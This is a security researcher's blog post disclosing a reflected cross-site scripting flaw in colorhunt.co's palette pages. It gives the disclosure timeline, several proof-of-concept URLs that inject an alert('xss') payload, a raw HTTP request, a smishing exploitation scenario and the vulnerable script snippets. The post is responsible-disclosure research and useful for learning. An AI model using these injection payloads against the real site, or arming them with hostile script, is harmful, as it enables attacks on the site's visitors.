---
title: Colorhunt.co Reflective Cross-Site Scripting (XSS) via Pallet Type
description: Finding Multiple DOM-Based XSS Vulnerabilities
featured: true
feature-header: "Featured Research \U0001F447"
tag: Vulnerability Research
image: "/assets/img/posts/2021-06-28-CVE-2021-35956/preview.png"
layout: post
date: '2021-06-28 00:01:21 -0400'
last-updated: '2021-06-28 00:01:21 -0400'
style: blog1
author: Tyler Butler
lead: Finding Multiple DOM-Based XSS Vulnerabilities
card: card-2
postid: 1
navheader: posts
---

In this post, I'll describe a DOM based reflective cross-site scripting vulnerability I disclosed to colorhunt.co back on June 5th. While the application owner was appreciative of the disclosure, they stated they were already aware of the vulnerability and had no plans to mitigate the risks. I offered to wait for public disclosure until a patch had been issued, and provided several mitigation strategies which could reduce the impact of the vulnerability, ultimately publishing this disclosure in late August. 

####  **Index**  
+  [Disclosure Timeline]({{page.url}}#-disclosure-timeline)  
+  [Executive Summary]({{page.url}}#executive-summary)  
+  [Proof of Concept]({{page.url}}#proof-of-concept)     

#### **⏱ Disclosure Timeline**

  <div class="timeline mt-1 mb-1">
      <div class="tl-item active">
          <div class="tl-dot b-warning"></div>
          <div class="tl-content">
              <div class="">I attempt to find a security contact at colorhunt.co, could not do so, and contacted team@colorhunt.co and product developer hello@galshir.com</div>
              <div class="tl-date text-muted mt-1">5 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-warning"></div>
          <div class="tl-content">
              <div class="">I recieve response hello@galshir.com requesting the disclosure details</div>
              <div class="tl-date text-muted mt-1">5 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-primary"></div>
          <div class="tl-content">
              <div class="">I provide a complete <a href="/assets/pdf/colorhunt_xss_disclosure.pdf" class="highlighted">disclosure report</a></div>
              <div class="tl-date text-muted mt-1">6 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-primary"></div>
          <div class="tl-content">
              <div class="">Colorhunt product developer states they were aware of the vulnerability</div>
              <div class="tl-date text-muted mt-1">7 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-primary"></div>
          <div class="tl-content">
              <div class="">I state I'll will wait for public disclsure until fix is live</div>
              <div class="tl-date text-muted mt-1">9 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-danger"></div>
          <div class="tl-content">
              <div class="">I do not recieve a response from previous email, and email again stating my desire to publish early July or wait longer if a patch will be published</div>
              <div class="tl-date text-muted mt-1">30 June 2021</div>
          </div>
      </div>
      <div class="tl-item">
          <div class="tl-dot b-danger"></div>
          <div class="tl-content">
              <div class="">I do not hear back from product developer and publish the disclosure</div>
              <div class="tl-date text-muted mt-1">25 Aug 2021</div>
          </div>
      </div>
    </div>



### **Executive Summary**   
On June 5th, I discovered a reflected cross-site (xss) scripting vulnerability in colorhunt.co via the pallet type selection. Malicious users can inject arbitrary javascript directly into two script elements by appending a crafted payload to the end of the pallet name in the resource `/palettes/[term]`. This vulnerability can be used to spread malicious links that execute client-side code in victim browsers. It is recommended that colorhunt triage this vulnerability as soon as possible, and implement validation and sanitization measures.

### **Proof of Concept**:  
To demonstrate the vulnerability, I created a few proof of concept exploits. Notice that any payload will execute if placed after `/pallets/`, and the use of pallet terms like 'trendy' is not necessary. Performing a GET request with the following urls will result in an alert box executing.  
- [x] [https://colorhunt.co/palettes/trendy%22;alert('xss');var%20foo%20=%20%22foo](https://colorhunt.co/palettes/trendy%22;alert('xss');var%20foo%20=%20%22foo)  
- [x] [https://colorhunt.co/palettes/popular%22;alert('xss');var%20foo%20=%20%22foo](https://colorhunt.co/palettes/popular%22;alert('xss');var%20foo%20=%20%22foo)
- [x] [https://colorhunt.co/palettes/random%22;alert('xss');var%20foo%20=%20%22foo](https://colorhunt.co/palettes/random%22;alert('xss');var%20foo%20=%20%22foo)
- [x] [https://colorhunt.co/palettes/%22;alert('xss');var%20foo%20=%20%22foo](https://colorhunt.co/palettes/%22;alert('xss');var%20foo%20=%20%22foo)
- [x] [https://colorhunt.co/palettes/idontexist%22;alert('xss');var%20foo%20=%20%22foo](https://colorhunt.co/palettes/idontexist%22;alert('xss');var%20foo%20=%20%22foo)

**Payload**:  `trendy%22;alert('xss');var%20foo%20=%20%22foo`

```yaml
GET /palettes/trendy%22;alert('xss');var%20foo%20=%20%22foo HTTP/2
Host: colorhunt.co
Cookie: _ga=GA1.2.899449749.1622947948; _gid=GA1.2.309200134.1622947949; __gads=ID=e1e1623e28567740-22296d5a887a004b:T=1622947948:RT=1622947948:S=ALNI_MayH-wZSN2DBrZpy709ubLpdffneA
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="90"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```  



<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/xss.png">
    </div>
</div>  


## Exploitability  
Below is a quick sample scenario that shows how this vulnerability can be exploited  

> *Attacker sends targeted smishing message to victim*  


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/scenario_part1.png">
    </div>
</div>  


> *Vitim recieves message and opens link*  



<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/scenario_part2.png">
    </div>
</div>  


> *Payload executes in vicitm browser*  


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/scenario_part3.png">
    </div>
</div>  


### **Vulnerable Components**  

I've identified the following component as the root cause of the reflected XSS vulnerability.  

#### Vulnerable Component 1

The script element near line 193 of `https://colorhunt.co/palettes/trendy` takes the pallet type name ( in this case "trendy") and injects it into the `tags` variable. To exploit this, the payload above closes the tags variable, injects an arbitrary javascript function (in the below example, to log to the console), and then declares a new variable to close out the payload.  

```javascript
<script>
var tags = "trendy";console.log('foo');var foo = "foo";
var sort = "new";
$('#sort_menu new').addClass("selected");

t = 0;
step = 0;
oktoload = "yes";

if(navigator.userAgent.toLowerCase().indexOf('firefox') > -1){
  $('#likes .list').css('overflow','hidden');
}

$(function() {
  taker(step,sort,tags);
  list_likes();
  select_sort_button(sort);
  setTimeout(function() { like_first_palette_tip(); }, 1500);
});
</script>
```


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/vulnerable-component-1.png">
    </div>
</div>  

#### Vulnerable Component 2: 

The script element near line 222 of `https://colorhunt.co/palettes/trendy` takes the pallet type name ( in this case "trendy") and injects it into the `current` variable. To exploit this, the payload above closes the tags variable, injects an arbitrary javascript function (in the below example, to log to the console), and then declares a new variable to close out the payload.  

```javascript
<script type="text/javascript">

$(function() {
  current = "palettes";
  tags = "trendy";alert('abc123');var foo = "foo";
  select_menu_button(current);
});
```


<div class="row mt-3">
    <div class="center">
        <img class="img-fluid rounded z-depth-1" src="/assets/img/posts/2021-07-01-colorhunt-xss/vulnerable-component-2.png">
    </div>
</div>  
